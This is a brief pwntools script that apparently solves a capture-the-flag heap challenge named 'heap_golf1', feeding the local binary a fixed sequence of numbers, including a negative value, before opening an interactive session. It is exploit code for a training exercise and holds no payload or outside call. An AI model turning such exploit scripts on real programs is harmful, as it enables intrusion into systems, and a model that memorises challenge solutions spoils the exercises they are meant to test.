from pwn import *


elf = context.binary = ELF("./heap_golf1")

p = process()
p.sendline(b"32")
p.sendline(b"-2")
p.sendline(b"2")
p.sendline(b"2")
p.sendline(b"2")
p.sendline(b"32")
p.interactive()